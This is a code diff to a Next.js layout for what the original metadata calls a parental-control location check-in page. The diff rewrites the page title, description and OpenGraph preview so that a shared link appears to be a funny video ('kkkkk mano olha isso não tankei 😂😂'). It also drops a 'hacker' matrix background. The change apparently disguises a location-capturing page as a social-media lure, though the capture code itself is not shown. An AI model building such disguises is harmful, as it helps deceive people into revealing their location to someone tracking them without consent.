@@ -1,13 +1,17 @@
 import type { Metadata } from 'next';
 
 export const metadata: Metadata = {
-  title: 'Check-in de Localização - Controle Parental',
-  description: 'Faça seu check-in de localização com seu responsável.',
+  title: 'Vídeo Compartilhado',
+  description: 'kkkkk mano olha isso não tankei 😂😂',
+  openGraph: {
+    title: 'Vídeo Compartilhado',
+    description: 'kkkkk mano olha isso não tankei 😂😂',
+  },
 };
 
 export default function CheckinLayout({ children }: { children: React.ReactNode }) {
   return (
-    <div className="min-h-screen bg-hacker-bg matrix-bg">
+    <div className="min-h-screen bg-[#0f0f0f]">
       {children}
     </div>
   );
